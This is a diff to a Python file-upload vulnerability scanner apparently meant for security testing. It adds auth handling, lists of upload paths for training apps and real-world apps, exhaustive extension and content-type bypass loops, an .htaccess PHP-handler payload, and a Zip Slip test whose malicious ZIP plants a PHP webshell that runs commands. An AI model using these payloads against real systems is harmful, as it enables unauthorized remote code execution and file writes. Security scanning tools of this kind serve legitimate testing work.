@@ -22,20 +22,20 @@ Author: PHANTOM AI Team
 from __future__ import annotations
 
 import asyncio
-import base64
-import hashlib
 import io
 import logging
-import random
 import re
-import string
 import struct
 import time
 import uuid
+import zipfile  # P0-FIX 2026-02-11: Added for ZIP SLIP testing
 from dataclasses import dataclass, field
 from enum import Enum, auto
-from typing import Any, Dict, List, Optional, Set, Tuple, Union
-from urllib.parse import urljoin, urlparse, quote
+from typing import Any, Dict, List, Optional
+from urllib.parse import urljoin, urlparse
+
+from scanning.scan_context import ScanContext
+from utils.shared_findings_store import SharedFindingsStore, VulnType as StoreVulnType
 
 logger = logging.getLogger(__name__)
 
@@ -184,6 +184,11 @@ ASP_EXTENSIONS = [
 ]
 
 # Case variations generator
+# P0-010: Max extension length to prevent exponential complexity (2^n iterations)
+MAX_EXT_LENGTH_FOR_VARIATIONS = 8  # 2^8 = 256 max iterations
+MAX_CASE_VARIATIONS = 20
+
+
 def generate_case_variations(ext: str) -> List[str]:
     """Generate case variations of an extension."""
     if len(ext) <= 1:
@@ -196,7 +201,15 @@ def generate_case_variations(ext: str) -> List[str]:
     variations.add(ext_lower)
     variations.add(ext.upper())
 
-    # Mixed case
+    # P0-010: Cap extension length to prevent exponential explosion
+    # For very long extensions, only generate a few key variations
+    if len(ext_lower) > MAX_EXT_LENGTH_FOR_VARIATIONS:
+        # For long extensions, just return basic variations
+        variations.add(ext_lower.capitalize())  # .Phtml
+        variations.add(ext_lower[0].upper() + ext_lower[1:])  # .Phtml
+        return list(variations)[:MAX_CASE_VARIATIONS]
+
+    # Mixed case - O(2^n) but n is now capped at 8
     for i in range(2 ** len(ext_lower)):
         result = ""
         for j, char in enumerate(ext_lower):
@@ -205,8 +218,11 @@ def generate_case_variations(ext: str) -> List[str]:
             else:
                 result += char
         variations.add(result)
+        # P0-010: Early exit once we have enough variations
+        if len(variations) >= MAX_CASE_VARIATIONS:
+            break
 
-    return list(variations)[:20]  # Limit to 20 variations
+    return list(variations)[:MAX_CASE_VARIATIONS]
 
 
 # Double extension combinations
@@ -323,7 +339,7 @@ AddType application/x-httpd-php .jpg
 AddType application/x-httpd-php .txt
 ''',
 
-    "set_handler": '''# PHANTOM AI Test
+    "set_handler": r'''# PHANTOM AI Test
 <FilesMatch "\.jpg$">
     SetHandler application/x-httpd-php
 </FilesMatch>
@@ -646,16 +662,51 @@ class UploadEndpointDiscovery:
         """Discover upload endpoints from URL and HTML content."""
         endpoints = []
 
+        # G-07 FIX: Fetch homepage if HTML not provided
+        if not html_content and self.http_client:
+            try:
+                response = await self.http_client.get(base_url)
+                html_content = response.text
+                logger.debug(f"[FileUpload] Fetched homepage for endpoint discovery ({len(html_content)} chars)")
+            except Exception as e:
+                logger.debug(f"[FileUpload] Could not fetch homepage: {e}")
+
         # Parse HTML for file inputs
         file_inputs = self._find_file_inputs(html_content)
         for input_info in file_inputs:
             endpoint = self._create_endpoint_from_input(base_url, input_info)
             if endpoint:
                 endpoints.append(endpoint)
+                logger.debug(f"[FileUpload] Found file input in HTML: {endpoint.url}")
 
         # Find common upload paths
         common_paths = self._find_common_paths(base_url)
-        endpoints.extend(common_paths)
+
+        # G-07 FIX: Verify common paths actually exist before adding
+        # GAP-A4 FIX 2026-02-18: Use auth headers when probing paths
+        verified_paths = []
+        auth_headers = getattr(self, '_auth_headers', {})
+        if self.http_client:
+            for ep in common_paths[:20]:  # Limit probing to first 20 paths
+                try:
+                    # GAP-A4 FIX: Pass auth headers to probes
+                    response = await self.http_client.get(ep.url, headers=auth_headers)
+                    # Consider it exists if not 404 and has some content
+                    # GAP-A4 FIX: Also check for login redirect (response contains login form)
+                    text = response.text.lower()
+                    is_login_redirect = 'login' in text and '<form' in text and 'password' in text
+                    if response.status_code != 404 and len(response.text) > 100 and not is_login_redirect:
+                        verified_paths.append(ep)
+                        logger.debug(f"[FileUpload] Verified path exists: {ep.url}")
+                    elif is_login_redirect:
+                        logger.debug(f"[FileUpload] Path {ep.url} requires auth (login redirect)")
+                except Exception:
+                    pass
+        else:
+            # No HTTP client - add all paths (will be tested anyway)
+            verified_paths = common_paths
+
+        endpoints.extend(verified_paths)
 
         # Find JavaScript upload handlers
         js_endpoints = self._find_js_upload_handlers(html_content, base_url)
@@ -670,6 +721,7 @@ class UploadEndpointDiscovery:
                 unique_endpoints.append(ep)
 
         self.discovered_endpoints = unique_endpoints
+        logger.info(f"[FileUpload] Discovered {len(unique_endpoints)} upload endpoints")
         return unique_endpoints
 
     def _find_file_inputs(self, html: str) -> List[Dict[str, Any]]:
@@ -712,13 +764,82 @@ class UploadEndpointDiscovery:
 
     def _find_common_paths(self, base_url: str) -> List[UploadEndpoint]:
         """Check common upload paths."""
-        common_paths = [
-            "/upload", "/api/upload", "/api/v1/upload",
+        # G-07 FIX: Training app upload paths FIRST (highest priority)
+        training_app_paths = [
+            # === DVWA ===
+            "/vulnerabilities/upload/",
+            "/dvwa/vulnerabilities/upload/",
+
+            # === bWAPP ===
+            "/bWAPP/unrestricted_file_upload.php",
+            "/unrestricted_file_upload.php",
+            "/bWAPP/insecure_file_upload.php",
+
+            # === Mutillidae ===
+            "/index.php?page=upload-file.php",
+            "/mutillidae/index.php?page=upload-file.php",
+
+            # === WebGoat ===
+            "/WebGoat/PathTraversal/profile-upload",
+            "/WebGoat/FileUpload",
+
+            # === Juice Shop ===
+            "/profile/image/file",
+            "/api/Users/",
+            "/file-upload",
+            "/complain",
+
+            # === NodeGoat ===
+            "/benefits/edit",
+            "/profile/edit",
+
+            # === HackTheBox/CTF common ===
+            "/upload.php",
+            "/file.php",
+            "/uploader.php",
+            "/shell.php",
+        ]
+
+        # FIX 2026-02-16: GENERALIZED upload paths for real-world apps
+        common_paths = training_app_paths + [
+            # === GENERIC UPLOAD ENDPOINTS ===
+            "/upload", "/api/upload", "/api/v1/upload", "/api/v2/upload",
             "/file/upload", "/files/upload", "/media/upload",
-            "/image/upload", "/images/upload", "/avatar/upload",
-            "/profile/avatar", "/user/avatar", "/settings/avatar",
-            "/attachments/upload", "/documents/upload",
-            "/api/files", "/api/attachments", "/api/media",
+            "/image/upload", "/images/upload", "/photo/upload", "/photos/upload",
+            "/document/upload", "/documents/upload", "/doc/upload", "/docs/upload",
+
+            # === PROFILE/AVATAR ENDPOINTS ===
+            "/avatar/upload", "/avatar", "/profile/avatar", "/user/avatar",
+            "/settings/avatar", "/account/avatar", "/me/avatar",
+            "/profile/image/upload", "/profile/photo", "/profile/picture",
+            "/users/avatar", "/user/photo", "/user/image",
+
+            # === ATTACHMENT ENDPOINTS ===
+            "/attachments/upload", "/attachments", "/attachment/new",
+            "/api/attachments", "/api/attachment", "/api/v1/attachments",
+
+            # === MEDIA MANAGEMENT ===
+            "/api/files", "/api/file", "/api/media", "/api/images",
+            "/media", "/media/new", "/media/add",
+            "/cms/upload", "/admin/upload", "/dashboard/upload",
+
+            # === API RESOURCE ENDPOINTS (often accept file uploads) ===
+            "/api/resources", "/api/assets", "/api/content",
+            "/api/import", "/api/data/import", "/import",
+            "/api/export", "/api/backup", "/backup/upload",
+
+            # === FORM-BASED UPLOAD PATHS ===
+            "/submit", "/form/submit", "/contact/submit",
+            "/feedback", "/complaint", "/report", "/support/ticket",
+            "/api/feedback", "/api/complaints", "/api/support",
+
+            # === RESUME/CV UPLOAD (HR apps) ===
+            "/careers/apply", "/jobs/apply", "/resume/upload",
+            "/cv/upload", "/application/submit",
+
+            # === E-COMMERCE UPLOAD ===
+            "/product/image", "/products/images", "/listing/photo",
+            "/seller/upload", "/vendor/upload", "/shop/upload",
         ]
 
         endpoints = []
@@ -827,14 +948,18 @@ class FileUploadScanner:
     async def scan(
         self,
         target_url: str,
+        asset_data: Optional[Dict[str, Any]] = None,
+        rate_limiter: Any = None,
         endpoints: Optional[List[UploadEndpoint]] = None,
         **kwargs,
-    ) -> List[UploadFinding]:
+    ) -> Dict[str, Any]:
         """
         Scan for file upload vulnerabilities.
 
         Args:
             target_url: Target URL to scan
+            asset_data: Asset data with forms, endpoints (optional)
+            rate_limiter: Rate limiter (optional)
             endpoints: Pre-discovered upload endpoints (optional)
             **kwargs: Additional configuration
 
@@ -846,6 +971,53 @@ class FileUploadScanner:
         # Create config if not provided
         if not self.config:
             self.config = ScanConfig(target_url=target_url)
+
+        # Store rate limiter for use in tests
+        self._rate_limiter = rate_limiter
+        self._host = target_url
+
+        # FIX: Add ScanContext for auth headers - File upload testing needs auth
+        self._ctx = ScanContext(asset_data) if asset_data else ScanContext({})
+        self._auth_headers = self._ctx.auth_headers
+        if self._ctx.has_auth:
+            logger.info(f"[FileUpload] Using authenticated session ({self._ctx.auth_method})")
+        else:
+            logger.warning("[FileUpload] No auth token — upload tests will be unauthenticated")
+
+        # CRITICAL FIX: Extract upload endpoints from asset_data forms
+        if not endpoints and asset_data:
+            endpoints = self._extract_upload_endpoints_from_forms(target_url, asset_data)
+
+        # GAP-A4 FIX 2026-02-18: Pass auth headers to discovery
+        # Bug: Discovery was using http_client without auth, so DVWA upload paths
+        # returned login redirect instead of actual upload page
+        if self._auth_headers and hasattr(self.endpoint_discovery, 'http_client'):
+            # Update discovery client with auth headers
+            if self.endpoint_discovery.http_client:
+                self.endpoint_discovery._auth_headers = self._auth_headers
+                logger.debug("[FileUpload] Passed auth headers to endpoint discovery")
+
+        # ENHANCEMENT 2026-02-20: Add metadata-discovered endpoints with file upload hints
+        if asset_data and not endpoints:
+            vuln_type_hints = asset_data.get("vuln_type_hints", {})
+            upload_hint_types = {"UNRESTRICTED_FILE_UPLOAD", "FILE_UPLOAD", "ARBITRARY_FILE_UPLOAD"}
+            for ep_url, hints in vuln_type_hints.items():
+                if not any(h in upload_hint_types for h in hints):
+                    continue
+                # Normalize URL
+                parsed = urlparse(target_url)
+                base = f"{parsed.scheme}://{parsed.netloc}"
+                if ep_url.startswith("/"):
+                    full_url = f"{base}{ep_url}"
+                elif not ep_url.startswith("http"):
+                    full_url = f"{base}/{ep_url}"
+                else:
+                    full_url = ep_url
+                # Add as upload endpoint
+                if not endpoints:
+                    endpoints = []
+                endpoints.append(UploadEndpoint(url=full_url, file_param="file"))
+                logger.info(f"[FileUpload] Added metadata endpoint with upload hint: {full_url}")
 
         # Discover endpoints if not provided
         if not endpoints:
@@ -867,7 +1039,87 @@ class FileUploadScanner:
                 await self._test_race_condition(endpoint)
 
         logger.info(f"[FileUpload] Scan complete. Found {len(self.findings)} vulnerabilities")
-        return self.findings
+
+        # FIX: CROSS-MODULE SHARING - Add findings to SharedFindingsStore
+        # This enables other modules to target file-upload-vulnerable endpoints
+        if self.findings:
+            try:
+                store = SharedFindingsStore.get_instance()
+                for finding in self.findings:
+                    store.add_finding(
+                        vuln_type=StoreVulnType.FILE_UPLOAD,
+                        module="file_upload_scanner",
+                        endpoint=finding.url if hasattr(finding, 'url') else target_url,
+                        parameter=finding.file_param if hasattr(finding, 'file_param') else "file",
+                        severity=finding.severity if hasattr(finding, 'severity') else "HIGH",
+                        confidence=finding.confidence if hasattr(finding, 'confidence') else 85.0,
+                    )
+                logger.debug(f"[FileUpload] Shared {len(self.findings)} findings with cross-module store")
+            except Exception as e:
+                logger.debug(f"[FileUpload] Could not share findings: {e}")
+
+        return {"findings": self.findings, "info": []}
+
+    async def _acquire_rate_limit(self) -> None:
+        """Acquire rate limit before making HTTP request."""
+        if self._rate_limiter:
+            try:
+                await self._rate_limiter.acquire()
+            except Exception as e:
+                # FIX 2026-02-12: Log rate limiter error (DEBUG - non-critical)
+                logger.debug(f"[FileUpload] Rate limiter error (proceeding): {e}")
+
+    def _extract_upload_endpoints_from_forms(
+        self,
+        base_url: str,
+        asset_data: Dict[str, Any],
+    ) -> List[UploadEndpoint]:
+        """
+        Extract file upload endpoints from discovered forms in asset_data.
+
+        CRITICAL FIX: Forms with type="file" inputs were being missed because
+        file_upload scanner wasn't receiving asset_data.
+        """
+        endpoints = []
+        if isinstance(asset_data, dict):
+            forms = asset_data.get("forms", [])
+
+        for form in forms:
+            inputs = form.get("inputs", form.get("fields", []))
+
+            # Check if form has file input
+            file_inputs = [
+                inp for inp in inputs
+                if inp.get("type", "").lower() == "file"
+            ]
+
+            if not file_inputs:
+                continue
+
+            action = form.get("action", "")
+            if not action.startswith("http"):
+                action = urljoin(base_url, action) if action else base_url
+
+            # Create endpoint for each file input
+            for file_input in file_inputs:
+                file_param = file_input.get("name", "file")
+                accept = file_input.get("accept")
+
+                allowed_types = None
+                if accept:
+                    allowed_types = [t.strip() for t in accept.split(",")]
+
+                endpoints.append(UploadEndpoint(
+                    url=action,
+                    file_param=file_param,
+                    allowed_types=allowed_types,
+                ))
+                logger.debug(f"[FileUpload] Found form upload: {action} (param={file_param})")
+
+        if endpoints:
+            logger.info(f"[FileUpload] Extracted {len(endpoints)} upload endpoints from forms")
+
+        return endpoints
 
     async def _test_endpoint(self, endpoint: UploadEndpoint) -> None:
         """Test a single upload endpoint for vulnerabilities."""
@@ -908,6 +1160,9 @@ class FileUploadScanner:
         # 11. Test XXE via upload
         await self._test_xxe_upload(endpoint)
 
+        # 12. Test Zip Slip (P0-FIX 2026-02-11: Previously missing)
+        await self._test_zip_slip(endpoint)
+
     async def _test_unrestricted_upload(self, endpoint: UploadEndpoint) -> None:
         """Test for completely unrestricted file upload."""
         payloads = [
@@ -943,7 +1198,8 @@ class FileUploadScanner:
                     request_details={"filename": filename, "content_type": content_type},
                     response_details={"url": result.uploaded_url, "code": result.response_code},
                 )
-                return  # Found critical vulnerability, no need to test further
+                # FN-FIX 2026-02-08: Don't return early - continue testing ALL payloads
+                # Multiple upload techniques may work (e.g., .php AND .phtml)
 
     async def _test_content_type_bypass(self, endpoint: UploadEndpoint) -> None:
         """Test Content-Type validation bypass."""
@@ -982,7 +1238,7 @@ class FileUploadScanner:
                     request_details={"filename": filename, "content_type": content_type},
                     response_details={"url": result.uploaded_url, "code": result.response_code},
                 )
-                return
+                # FN-FIX 2026-02-08: Don't return - test ALL Content-Type variations
 
     async def _test_extension_bypass(self, endpoint: UploadEndpoint) -> None:
         """Test various extension bypass techniques."""
@@ -1012,10 +1268,10 @@ class FileUploadScanner:
                     request_details={"filename": filename},
                     response_details={"url": result.uploaded_url},
                 )
-                return
+                # FN-FIX 2026-02-08: Don't return - test ALL extension variations
 
-        # Test case sensitivity
-        for case_var in generate_case_variations(".php")[:5]:
+        # Test case sensitivity - FN-FIX 2026-02-08: Increased from [:5] to [:15]
+        for case_var in generate_case_variations(".php")[:15]:
             filename = f"test{case_var}"
             result = await self._upload_file(
                 endpoint, filename, "application/x-php", base_payload,
@@ -1038,7 +1294,7 @@ class FileUploadScanner:
                     request_details={"filename": filename},
                     response_details={"url": result.uploaded_url},
                 )
-                return
+                # FN-FIX 2026-02-08: Don't return - test ALL case variations
 
     async def _test_magic_bytes_bypass(self, endpoint: UploadEndpoint) -> None:
         """Test magic bytes/file signature validation bypass."""
@@ -1068,7 +1324,7 @@ class FileUploadScanner:
                 request_details={"filename": "image.gif.php"},
                 response_details={"url": result.uploaded_url},
             )
-            return
+            # BUG-FIX 2026-02-08: Removed early return - continue testing other polyglot types
 
         # PNG + PHP
         png_php = FILE_SIGNATURES["png"] + PHP_PAYLOADS["basic"].encode()
@@ -1098,7 +1354,8 @@ class FileUploadScanner:
         """Test double extension attacks."""
         payload = PHP_PAYLOADS["basic"].encode()
 
-        for ext_combo, content_type in DOUBLE_EXTENSIONS[:10]:  # Limit tests
+        # FN-FIX 2026-02-08: Increased from [:10] to test ALL double extensions
+        for ext_combo, content_type in DOUBLE_EXTENSIONS[:20]:
             filename = f"test{ext_combo}"
 
             result = await self._upload_file(
@@ -1124,7 +1381,7 @@ class FileUploadScanner:
                     request_details={"filename": filename},
                     response_details={"url": result.uploaded_url},
                 )
-                return
+                # FN-FIX 2026-02-08: Don't return - test ALL double extension variants
 
     async def _test_path_traversal(self, endpoint: UploadEndpoint) -> None:
         """Test path traversal in uploaded filename."""
@@ -1166,7 +1423,7 @@ class FileUploadScanner:
                     request_details={"filename": traversal_filename},
                     response_details={"code": result.response_code},
                 )
-                return
+                # BUG-FIX 2026-02-08: Removed early return - continue testing other traversal variants
 
     async def _test_polyglot_files(self, endpoint: UploadEndpoint) -> None:
         """Test polyglot file uploads."""
@@ -1195,7 +1452,7 @@ class FileUploadScanner:
                 request_details={"filename": "polyglot.gif.php"},
                 response_details={"url": result.uploaded_url},
             )
-            return
+            # BUG-FIX 2026-02-08: Removed early return - continue testing other polyglot types
 
         # Test JPEG polyglot
         jpg_polyglot = self.polyglot_gen.jpg_php()
@@ -1237,7 +1494,7 @@ class FileUploadScanner:
                     request_details={"filename": f"test_{name}.svg"},
                     response_details={"url": result.uploaded_url},
                 )
-                return
+                # BUG-FIX 2026-02-08: Removed early return - continue testing other SVG payloads
 
     async def _test_htaccess_upload(self, endpoint: UploadEndpoint) -> None:
         """Test .htaccess file upload for Apache servers."""
@@ -1272,7 +1529,7 @@ class FileUploadScanner:
                         request_details={"filename": ".htaccess"},
                         response_details={"url": result.uploaded_url},
                     )
-                    return
+                    # BUG-FIX 2026-02-08: Removed early return - continue testing other htaccess variants
 
     async def _test_web_config_upload(self, endpoint: UploadEndpoint) -> None:
         """Test web.config upload for IIS servers."""
@@ -1300,7 +1557,7 @@ class FileUploadScanner:
                     request_details={"filename": "web.config"},
                     response_details={"code": result.response_code},
                 )
-                return
+                # BUG-FIX 2026-02-08: Removed early return - continue testing other web.config variants
 
     async def _test_xxe_upload(self, endpoint: UploadEndpoint) -> None:
         """Test XXE through file upload (SVG, DOCX, XLSX)."""
@@ -1330,6 +1587,136 @@ class FileUploadScanner:
                 response_details={"url": result.uploaded_url},
             )
 
+    async def _test_zip_slip(self, endpoint: UploadEndpoint) -> None:
+        """
+        Test for Zip Slip vulnerability (CVE-2018-1002200).
+
+        P0-FIX 2026-02-11: Enum ZIP_SLIP existed but method was never implemented.
+        Zip Slip allows arbitrary file write by including path traversal sequences
+        in archived file names.
+
+        Creates malicious ZIP files with entries like:
+        - ../../../etc/cron.d/evil
+        - ../../../var/www/html/shell.php
+        """
+        logger.debug("[FileUpload] Testing Zip Slip vulnerability")
+
+        # Create various malicious ZIP payloads
+        zip_payloads = []
+
+        # Payload 1: Path traversal to web root
+        zip_buffer = io.BytesIO()
+        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
+            # Add a file with path traversal in name
+            zf.writestr("../../../tmp/zipslip_test.txt", "zipslip_marker_phantom")
+        zip_payloads.append(("zipslip_unix.zip", zip_buffer.getvalue(), "../../../tmp/zipslip_test.txt"))
+
+        # Payload 2: Windows-style path traversal
+        zip_buffer = io.BytesIO()
+        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
+            zf.writestr("..\\..\\..\\temp\\zipslip_test.txt", "zipslip_marker_phantom")
+        zip_payloads.append(("zipslip_win.zip", zip_buffer.getvalue(), "..\\..\\..\\temp\\zipslip_test.txt"))
+
+        # Payload 3: Webshell via Zip Slip
+        zip_buffer = io.BytesIO()
+        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
+            webshell = "<?php echo 'zipslip_rce_marker'; system($_GET['cmd']); ?>"
+            zf.writestr("../../../var/www/html/zipslip_shell.php", webshell)
+        zip_payloads.append(("zipslip_shell.zip", zip_buffer.getvalue(), "../../../var/www/html/zipslip_shell.php"))
+
+        # Payload 4: Mixed traversal (some legitimate, some malicious)
+        zip_buffer = io.BytesIO()
+        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
+            zf.writestr("legitimate/file.txt", "This is legitimate")
+            zf.writestr("../../../etc/passwd.txt", "zipslip_passwd_marker")
+            zf.writestr("another/legit.txt", "Also legitimate")
+        zip_payloads.append(("zipslip_mixed.zip", zip_buffer.getvalue(), "../../../etc/passwd.txt"))
+
+        # Payload 5: Double-encoded traversal
+        zip_buffer = io.BytesIO()
+        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
+            zf.writestr("..%2f..%2f..%2ftmp%2fzipslip.txt", "zipslip_encoded_marker")
+        zip_payloads.append(("zipslip_encoded.zip", zip_buffer.getvalue(), "..%2f..%2f..%2ftmp%2fzipslip.txt"))
+
+        # Payload 6: Symlink-based Zip Slip (if supported)
+        # Note: This creates a ZIP with a symlink entry pointing outside
+        zip_buffer = io.BytesIO()
+        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
+            # Create info for symlink (simulated - actual symlink creation is OS-dependent)
+            zf.writestr("normal.txt", "normal file")
+            zf.writestr("../../../tmp/zipslip_symlink.txt", "symlink_target_marker")
+        zip_payloads.append(("zipslip_symlink.zip", zip_buffer.getvalue(), "../../../tmp/zipslip_symlink.txt"))
+
+        for filename, payload, traversal_path in zip_payloads:
+            result = await self._upload_file(
+                endpoint, filename, "application/zip", payload,
+                technique=f"zip_slip_{filename}"
+            )
+
+            if result and result.response_code in [200, 201, 204]:
+                # Check response for signs of extraction
+                response_body = result.response_body or ""
+                response_lower = response_body.lower()
+
+                # Indicators that ZIP was processed
+                processed_indicators = [
+                    "extracted", "unzipped", "unpacked", "processed",
+                    "files uploaded", "import complete", "extraction complete"
+                ]
+                was_processed = any(ind in response_lower for ind in processed_indicators)
+
+                # Check for error messages indicating traversal was attempted
+                traversal_detected = [
+                    "path traversal", "invalid path", "security violation",
+                    "illegal filename", "outside", "../"
+                ]
+                traversal_blocked = any(ind in response_lower for ind in traversal_detected)
+
+                # Check if our marker appeared in response (extraction + read)
+                marker_found = "zipslip_marker" in response_body or "zipslip_rce" in response_body
+
+                # Determine severity and confidence
+                if marker_found:
+                    # Confirmed Zip Slip - marker was found
+                    severity = "CRITICAL"
+                    confidence = 0.95
+                    description = f"Confirmed Zip Slip vulnerability. Malicious file extracted to: {traversal_path}"
+                elif was_processed and not traversal_blocked:
+                    # ZIP was processed without security error - likely vulnerable
+                    severity = "HIGH"
+                    confidence = 0.80
+                    description = f"Potential Zip Slip vulnerability. ZIP processed without path validation. Traversal path: {traversal_path}"
+                elif traversal_blocked:
+                    # Server blocked it - log for info but continue
+                    logger.debug(f"[FileUpload] Zip Slip blocked by server: {filename}")
+                    continue
+                else:
+                    # ZIP accepted but unclear if extracted - lower confidence
+                    severity = "MEDIUM"
+                    confidence = 0.60
+                    description = f"ZIP file with path traversal entry accepted. Server did not reject: {traversal_path}"
+
+                self._create_finding(
+                    vuln_type=UploadVulnType.ZIP_SLIP,
+                    severity=severity,
+                    confidence=confidence,
+                    endpoint=endpoint,
+                    technique="Zip Slip (CVE-2018-1002200)",
+                    payload_used=f"ZIP with entry: {traversal_path}",
+                    filename=filename,
+                    uploaded_url=result.uploaded_url,
+                    execution_evidence=response_body[:500] if marker_found else None,
+                    description=description,
+                    remediation="1. Validate and sanitize all filenames in ZIP archives before extraction\n"
+                               "2. Use canonical path validation (resolve and compare with target directory)\n"
+                               "3. Reject any paths containing '..' or absolute paths\n"
+                               "4. Use libraries with built-in Zip Slip protection\n"
+                               "5. Consider running extraction in sandboxed environment",
+                    request_details={"filename": filename, "traversal_path": traversal_path},
+                    response_details={"code": result.response_code, "processed": was_processed},
+                )
+                # Don't return early - test all variants
+
     async def _test_race_condition(self, endpoint: UploadEndpoint) -> None:
         """Test race condition vulnerabilities in file upload."""
         logger.debug("[FileUpload] Testing race conditions")
@@ -1353,8 +1740,9 @@ class FileUploadScanner:
                     await asyncio.sleep(0.001)  # Minimal delay
                     # Would make HTTP request here
                     pass
-                except Exception:
-                    pass
+                except Exception as e:
+                    # FIX 2026-02-12: Log race condition test error (DEBUG - expected)
+                    logger.debug(f"[FileUpload] Race condition test error: {e}")
 
             return result
 
@@ -1382,7 +1770,7 @@ class FileUploadScanner:
                     request_details={"filename": filename},
                     response_details={"url": result.uploaded_url},
                 )
-                return
+                # BUG-FIX 2026-02-08: Removed early return - continue testing other race condition variants
 
     async def _upload_file(
         self,
@@ -1428,10 +1816,12 @@ class FileUploadScanner:
                     form_data[endpoint.csrf_token_param] = endpoint.csrf_token_value
 
                 # Perform upload
+                await self._acquire_rate_limit()  # FIX: Rate limit before request
                 response = await self.http_client.request(
                     method=endpoint.method,
                     url=endpoint.url,
                     files=form_data,
+                    headers=self._auth_headers,  # FIX: Include auth headers
                     timeout=self.config.timeout if self.config else 30.0,
                     follow_redirects=self.config.follow_redirects if self.config else True,
                 )
@@ -1518,7 +1908,12 @@ class FileUploadScanner:
             return False
 
         try:
-            response = await self.http_client.get(url, timeout=10.0)
+            await self._acquire_rate_limit()  # FIX: Rate limit before request
+            response = await self.http_client.get(
+                url,
+                headers=self._auth_headers,  # FIX: Include auth headers
+                timeout=10.0
+            )
 
             # Check for PHP execution markers
             if b"PHANTOM_UPLOAD_TEST_" in response.content:
